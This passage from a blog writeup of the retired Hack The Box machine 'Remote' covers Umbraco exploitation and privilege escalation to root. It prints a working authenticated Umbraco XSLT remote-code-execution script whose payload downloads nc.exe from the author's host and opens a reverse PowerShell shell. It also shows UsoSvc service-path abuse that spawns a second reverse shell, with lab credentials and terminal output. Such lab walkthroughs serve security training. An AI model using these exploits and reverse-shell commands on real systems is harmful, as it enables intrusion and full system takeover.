<span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">);</span>

<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">);</span>
<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATE"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">];</span>
<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">];</span>
<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">];</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"__EVENTTARGET"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"__EVENTARGUMENT"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"__VIEWSTATE"</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s">"ctl00$body$xsltSelection"</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s">"ctl00$body$contentPicker$ContentIdValue"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"ctl00$body$visualizeDo"</span><span class="p">:</span><span class="s">"Visualize+XSLT"</span><span class="p">};</span>


<span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">);</span>

<span class="k">print</span><span class="p">(</span><span class="s">"End"</span><span class="p">);</span>
</pre></table></code></div></div><p>But we need to configure it according to our requirements</p><p>I changed the following things in the script</p><ul><li><p>login = “admin@htb.local”</p><li><p>password = “baconandcheese”</p><li><p>host = “http://remote.htb”</p><li><p>string cmd = “mkdir /tmp;iwr -uri http://10.10.15.107:8080/nc.exe -outfile /tmp/nc.exe;/tmp/nc.exe 10.10.15.107 2345 -e powershell”</p><li><p>proc.StartInfo.FileName = “powershell.exe”</p></ul><p>And after changing everything here is my final script</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span>

<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span><span class="p">;</span>

<span class="k">def</span> <span class="nf">print_dict</span><span class="p">(</span><span class="n">dico</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">dico</span><span class="p">.</span><span class="n">items</span><span class="p">());</span>
    
<span class="k">print</span><span class="p">(</span><span class="s">"Start"</span><span class="p">);</span>

<span class="c1"># Execute a calc for the PoC
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" </span><span class="se">\
</span><span class="s">xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" </span><span class="se">\
</span><span class="s">xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;</span><span class="se">\
</span><span class="s">&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() </span><span class="se">\
</span><span class="s">{ string cmd = "mkdir /tmp;iwr -uri http://10.10.15.107:8080/nc.exe -outfile /tmp/nc.exe;/tmp/nc.exe 10.10.15.107 2345 -e powershell"; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\
</span><span class="s"> proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;</span><span class="se">\
</span><span class="s"> proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span class="se">\
</span><span class="s"> proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span class="se">\
</span><span class="s"> &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;</span><span class="se">\
</span><span class="s"> &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; '</span><span class="p">;</span>

<span class="n">login</span> <span class="o">=</span> <span class="s">"admin@htb.local"</span><span class="p">;</span>
<span class="n">password</span><span class="o">=</span><span class="s">"baconandcheese"</span><span class="p">;</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">"http://remote.htb"</span><span class="p">;</span>


<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/"</span><span class="p">;</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_main</span><span class="p">);</span>
<span class="n">print_dict</span><span class="p">(</span><span class="n">r1</span><span class="p">.</span><span class="n">cookies</span><span class="p">);</span>


<span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"</span><span class="p">;</span>
<span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s">"password"</span><span class="p">:</span><span class="n">password</span><span class="p">};</span>
<span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">);</span>


<span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s">"/umbraco/developer/Xslt/xsltVisualize.aspx"</span><span class="p">;</span>
<span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">);</span>

<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">);</span>
<span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATE"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">];</span>
<span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">)[</span><span class="s">'value'</span><span class="p">];</span>
<span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">];</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'UMB-XSRF-TOKEN'</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"__EVENTTARGET"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"__EVENTARGUMENT"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"__VIEWSTATE"</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s">"__VIEWSTATEGENERATOR"</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s">"ctl00$body$xsltSelection"</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s">"ctl00$body$contentPicker$ContentIdValue"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span><span class="s">"ctl00$body$visualizeDo"</span><span class="p">:</span><span class="s">"Visualize+XSLT"</span><span class="p">};</span>


<span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">);</span>

<span class="k">print</span><span class="p">(</span><span class="s">"End"</span><span class="p">);</span>
</pre></table></code></div></div><h1 id="exploiting-the-umbraco">Exploiting the umbraco</h1><p>I started my <code class="language-plaintext highlighter-rouge">python server</code> on port 8080 and a <code class="language-plaintext highlighter-rouge">nc listner</code> on port 2345</p><p>And ran the script</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>➜  remote git:<span class="o">(</span>master<span class="o">)</span> ✗ python exploit.py
Start
<span class="o">[]</span>
</pre></table></code></div></div><p>Python server go hitted</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>➜  Tools git:<span class="o">(</span>master<span class="o">)</span> ✗ python <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
10.10.10.180 - - <span class="o">[</span>22/Mar/2020 18:39:27] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
</pre></table></code></div></div><p>And got a shell on nc</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nc <span class="nt">-nlvp</span> 2345
listening on <span class="o">[</span>any] 2345 ...
connect to <span class="o">[</span>10.10.15.107] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.180] 49684
Windows PowerShell 
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.

PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</pre></table></code></div></div><p>The flag was in public user dir this time</p><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PS C:<span class="se">\u</span>sers<span class="se">\p</span>ublic&gt; <span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
496--------------------------692
PS C:<span class="se">\u</span>sers<span class="se">\p</span>ublic&gt; 
</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege escalation to root</h1><p>After looking into available dirs i ran winPEAS.exe after transfering it to the machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>PS C:<span class="se">\t</span>mp&gt; iwr <span class="nt">-uri</span> http://10.10.15.107:8080/winPEAS.exe <span class="nt">-outfile</span> winpeas.exe
iwr <span class="nt">-uri</span> http://10.10.15.107:8080/winPEAS.exe <span class="nt">-outfile</span> winpeas.exe
PS C:<span class="se">\t</span>mp&gt; <span class="nb">ls
ls


    </span>Directory: C:<span class="se">\t</span>mp


Mode                LastWriteTime         Length Name                                                                  
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
<span class="nt">-a----</span>        3/22/2020   9:16 AM          61440 nc.exe                                                                
<span class="nt">-a----</span>        3/22/2020   9:20 AM         227840 winpeas.exe                                                           

</pre></table></code></div></div><p>Now i can ran it And i got an interesting service that is running and i have permission to modify it</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="go">  [+] Modifiable Services(T1007)
</span><span class="gp">   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#</span>services
<span class="go">    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess
</span></pre></table></code></div></div><p>The service is <code class="language-plaintext highlighter-rouge">UsoSvc</code></p><p>I found an awesome way to exploit the service on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-10---cve-2019-1322-usosvc">PayloadAllTheThings</a></p><h1 id="exploiting-the-usosvc-service">Exploiting the UsoSvc service</h1><p>I just need to add the binpath of the service with the <code class="language-plaintext highlighter-rouge">nc reverse shell</code> and <code class="language-plaintext highlighter-rouge">stop</code> the service and <code class="language-plaintext highlighter-rouge">start</code> it again</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\windows\system32\inetsrv</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">usosvc</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"C:\tmp\nc.exe 10.10.15.107 4444 -e powershell.exe"</span><span class="w">
</span><span class="nf">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">usosvc</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"C:\tmp\nc.exe 10.10.15.107 4444 -e powershell.exe"</span><span class="w">
</span><span class="p">[</span><span class="kt">SC</span><span class="p">]</span><span class="w"> </span><span class="nf">ChangeServiceConfig</span><span class="w"> </span><span class="nx">SUCCESS</span><span class="w">
</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\windows\system32\inetsrv</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">
</span><span class="nf">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">

</span><span class="nf">SERVICE_NAME:</span><span class="w"> </span><span class="nx">usosvc</span><span class="w"> 
        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="nf">WIN32</span><span class="w">  
        </span><span class="nf">STATE</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">3</span><span class="w">  </span><span class="nx">STOP_PENDING</span><span class="w"> 
                                </span><span class="p">(</span><span class="nf">NOT_STOPPABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">NOT_PAUSABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">IGNORES_SHUTDOWN</span><span class="p">)</span><span class="w">
        </span><span class="nf">WIN32_EXIT_CODE</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="nf">x0</span><span class="p">)</span><span class="w">
        </span><span class="nf">SERVICE_EXIT_CODE</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="nf">x0</span><span class="p">)</span><span class="w">
        </span><span class="nf">CHECKPOINT</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">0x3</span><span class="w">
        </span><span class="nf">WAIT_HINT</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">0x7530</span><span class="w">
</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\windows\system32\inetsrv</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">
</span><span class="nf">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">


</span></pre></table></code></div></div><p>I looked at my listener And i got a connection back</p><h1 id="got-roottxt">Got root.txt</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="nf">prashant</span><span class="w"> </span><span class="nx">git:</span><span class="p">(</span><span class="nf">master</span><span class="p">)</span><span class="w"> </span><span class="err">✗</span><span class="w"> </span><span class="nf">nc</span><span class="w"> </span><span class="nt">-nlvp</span><span class="w"> </span><span class="nx">4444</span><span class="w">
</span><span class="nf">listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="p">[</span><span class="kt">any</span><span class="p">]</span><span class="w"> </span><span class="nx">4444</span><span class="w"> </span><span class="o">...</span><span class="w">
</span><span class="nf">connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.15.107</span><span class="p">]</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="p">(</span><span class="nf">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.10.180</span><span class="p">]</span><span class="w"> </span><span class="mi">49691</span><span class="w">
</span><span class="nf">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> 
</span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">

</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">C:\users\Administrator\Desktop\root.txt</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="nf">C:\users\Administrator\Desktop\root.txt</span><span class="w">
</span><span class="nx">8e3---------------------------9ef1</span><span class="w">
</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> 

</span></pre></table></code></div></div><p>And we got root flag</p><p>Thanks for reading, a single feedback will be appreciated !!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/nfs/" class="post-tag no-text-decoration" >NFS</a> <a href="/tags/umbraco/" class="post-tag no-text-decoration" >umbraco</a> <a href="/tags/usosvc/" class="post-tag no-text-decoration" >usosvc</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >RCE</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Remote writeup - 0xPrashant&url=http://localhost:4000/posts/htb-remote/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Remote writeup - 0xPrashant&u=http://localhost:4000/posts/htb-remote/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Remote writeup - 0xPrashant&url=http://localhost:4000/posts/htb-remote/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blackfield/"><div class="card-body"> <span class="timeago small" > Jun 9 <i class="unloaded">2020-06-09T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blackfield writeup</h3><div class="text-muted small"><p> Introduction@Blackfield:~$ Column Details Name Blackfield IP 10.10.10.192 Points 40 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-traceback/" class="btn btn-outline-primary"><p>Hackthebox Traceback writeup</p></a> <a href="/posts/htb-sniper/" class="btn btn-outline-primary"><p>Hackthebox Sniper writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-remote/'; this.page.identifier = '/posts/htb-remote/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
